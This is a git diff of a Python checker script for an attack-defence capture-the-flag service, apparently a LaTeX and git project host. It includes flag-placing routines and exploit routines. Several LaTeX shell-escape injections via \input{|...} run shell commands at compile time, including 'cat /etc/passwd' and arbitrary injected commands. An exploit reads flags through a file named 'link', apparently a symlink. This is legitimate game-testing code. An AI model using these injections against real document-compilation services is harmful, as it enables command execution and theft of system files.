@@ -14,12 +14,24 @@ def app(): return checker.app
 
 @checker.putflag(0)
 async def putflag_zero(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> str:
-    (_, _, _, id) = await create_user_and_project(client, db, logger)
+    (username, password, _, id) = await create_user_and_project(client, db, logger)
 
-    await upload_file(client, id, "main.tex", task.flag, logger)
+    flag_text = """\\documentclass[12pt]{minimal}
+\\usepackage{verbatim}
+\\begin{document}
+%""" + task.flag + """
+\input{|"echo XGJlZ2lue3ZlcmJhdGltfQ== | base64 -d; cat main.tex; echo XGVuZHt2ZXJiYXRpbX0= | base64 -d"}
+\end{document}
+"""
 
-    await commit(client, id, "Minor changes to the layout", logger)
-    await push(client, id, logger)
+    path = await clone_project(username, password, id, task.address, logger)
+
+    open(f"{path}/main.tex", "w").write(flag_text)
+    await git_config_commit_and_push(path, username, "Minor changes to the layout.", logger)
+
+    await cleanup_clone(path)
+
+    await pull(client, id, logger)
 
     logger.info("putflag_zero: success")
 
@@ -40,84 +52,6 @@ async def getflag_zero(task: GetflagCheckerTaskMessage, client: AsyncClient, db:
     except KeyError:
         raise MumbleException("Missing database entry from putflag")
 
-    assert_equals(await download_file(client, id, 'main.tex', logger), task.flag, "flag dose not match")
-    
-    logger.info("getflag_zero: success")
-
-@checker.havoc(0)
-async def havoc_test_git(task: HavocCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
-    (username, password, _, id) = await create_user_and_project(client, db, logger)
-
-    # upload a file to the project
-    file_content = secrets.token_hex(32)
-    await upload_file(client, id, "main.tex", file_content, logger)
-    # commit the file
-    await commit(client, id, "Added main.tex", logger)
-    # push the change
-    await push(client, id, logger)
-
-    dev_null = "  > /dev/null 2>&1"
-
-    # clone the repo onto the checker
-    git_url = f"http://{username}:{password}@{task.address}:{service_port}/git/{id}"
-
-    if os.system(f"git -C /tmp/ clone {git_url} {dev_null}") != 0:
-        raise MumbleException("git clone failed")
-
-    # check, that the file is present
-    assert_equals(os.path.exists(f"/tmp/{id}/"), True, "git clone failed")
-    assert_equals(os.path.exists(
-        f"/tmp/{id}/main.tex"), True, "file not created")
-    assert_equals(open("/tmp/{id}/main.tex".format(id=id)
-                       ).read(), file_content, "file content does not match")
-    
-    logger.info("havoc_test_git: clone success")
-
-    # add a file locally
-    new_file_content = secrets.token_hex(32)
-    open(f"/tmp/{id}/newFile.tex", "w").write(new_file_content)
-
-    # commit it
-    os_succ(os.system(
-        f"git -C /tmp/{id} config user.email \"{username}@example.com\" {dev_null}"))
-    os_succ(
-        os.system(f"git -C /tmp/{id} config user.name \"{username}\" {dev_null}"))
-
-    os_succ(os.system(f"git -C /tmp/{id} add . {dev_null}"))
-    os_succ(
-        os.system(f"git -C /tmp/{id} commit -m 'Added newFile.tex' {dev_null}"))
-
-    logger.info("havoc_test_git: created commit")
-
-    # push it onto the server
-    if os.system(f"git -C /tmp/{id} push {dev_null}") != 0:
-        raise MumbleException("git push failed")
-    logger.info("havoc_test_git: push success")
-
-    # cleanup
-    os_succ(os.system(f"rm -rf /tmp/{id}/ {dev_null}"))
-
-    # let the server pull the changes
-    await pull(client, id, logger)
-
-    # download the file
-    new_file_content_dl = await download_file(client, id, "newFile.tex", logger)
-    assert_equals(new_file_content_dl, new_file_content,
-                  "file content does not match")
-    
-    await delete_user(client, logger)
-    logger.info("havoc_test_git: success")
-
-@checker.havoc(1)
-async def havoc_test_latex(task: HavocCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
-    (username, password, _, id) = await create_user_and_project(client, db, logger)
-    file_content = """\\documentclass[12pt]{minimal}
-\\usepackage{verbatim}
-\\begin{document}
-    \\input{|"echo XGJlZ2lue3ZlcmJhdGltfQ== | base64 --decode; cat /etc/passwd ; echo XGVuZHt2ZXJiYXRpbX0= | base64 --decode"}
-\\end{document}
-"""
-    await upload_file(client, id, "main.tex", file_content, logger)
     await compile(client, id, "main.tex", logger)
     pdf_bytes = await download_pdf(client, id, logger)
     
@@ -132,16 +66,15 @@ async def havoc_test_latex(task: HavocCheckerTaskMessage, client: AsyncClient, d
 
     os.remove(f"{file}.txt")
     os.remove(file)
+    
+    if task.flag not in output:
+        raise MumbleException("Flag not found")
 
-    expected_output = "root"
-    assert_equals(True, output.startswith(expected_output), "output does not match")
-
-    await delete_user(client, logger)
-    logger.info("havoc_test_latex: success")
+    logger.info("getflag_zero: success")
 
 
 @checker.exploit(0)
-async def exploit_zero(task: ExploitCheckerTaskMessage, client: AsyncClient, logger: LoggerAdapter) -> str:
+async def exploit_zero(task: ExploitCheckerTaskMessage, client: AsyncClient, searcher: FlagSearcher, logger: LoggerAdapter) -> str:
     (username, password, _, id) = await create_user_and_project(client, None, logger)
 
     path = await clone_project(username, password, id, task.address, logger)
@@ -166,7 +99,9 @@ async def exploit_zero(task: ExploitCheckerTaskMessage, client: AsyncClient, log
     await pull(client, id, logger)
 
     # get flag
-    return await download_file(client, id, "link", logger)
+    file = await download_file(client, id, "link", logger)
+    if flag := searcher.search_flag(file):
+        return flag
 
 @checker.exploit(1)
 async def exploit_one(task: ExploitCheckerTaskMessage, client: AsyncClient, searcher: FlagSearcher, logger: LoggerAdapter) -> str:
@@ -179,7 +114,7 @@ async def exploit_one(task: ExploitCheckerTaskMessage, client: AsyncClient, sear
     file_content = """\\documentclass[12pt]{minimal}
 \\usepackage{verbatim}
 \\begin{document}
-    \\input{|"echo XGJlZ2lue3ZlcmJhdGltfQ== | base64 --decode;""" + commands + """; echo XGVuZHt2ZXJiYXRpbX0= | base64 --decode"}
+    \\input{|"echo XGJlZ2lue3ZlcmJhdGltfQ== | base64 -d;""" + commands + """; echo XGVuZHt2ZXJiYXRpbX0= | base64 -d"}
 \\end{document}
 """
     await upload_file(client, id, "main.tex", file_content, logger)
@@ -226,53 +161,7 @@ async def getnoise_file_content(task: GetnoiseCheckerTaskMessage, client: AsyncC
     if await download_file(client, id, noise_name, logger) != noise:
         raise MumbleException()
     
-    await delete_user(client, logger)
     logger.info("getnoise_file_content: success")
-
-
-@checker.putnoise(1)
-async def putnoise_file_git(task: PutnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter):
-    (username, password, _, id) = await create_user_and_project(client, db, logger)
-
-    path = await clone_project(username, password, id, task.address, logger)
-
-    noise_name = secrets.token_hex(16)
-    noise = secrets.token_hex(32)
-
-    open(f"{path}/{noise_name}", "w").write(noise)
-    await git_config_commit_and_push(path, username, "I hope i am not too loud", logger)
-
-    await db.set("noise", (noise_name, noise))
-
-    await cleanup_clone(path)
-
-    await pull(client, id, logger)
-    logger.info("putnoise_file_git: success")
-
-
-@checker.getnoise(1)
-async def getnoise_file_git(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter):
-    try:
-        (username, password) = await db.get("credentials")
-        (name, id) = await db.get("project")
-        (noise_name, noise) = await db.get("noise")
-    except KeyError:
-        raise MumbleException("getnoise w/o putnoise")
-
-    await login_user(client, username, password, logger)
-
-    if await download_file(client, id, noise_name, logger) != noise:
-        raise MumbleException("Noise not present")
-
-    path = await clone_project(username, password, id, task.address, logger)
-    if open(f"{path}/{noise_name}", "r").read() != noise:
-        raise MumbleException("Noise not present")
-
-    await cleanup_clone(path)
-
-    await delete_user(client, logger)
-
-    logger.info("getnoise_file_git: success")
 
 
 if __name__ == "__main__":
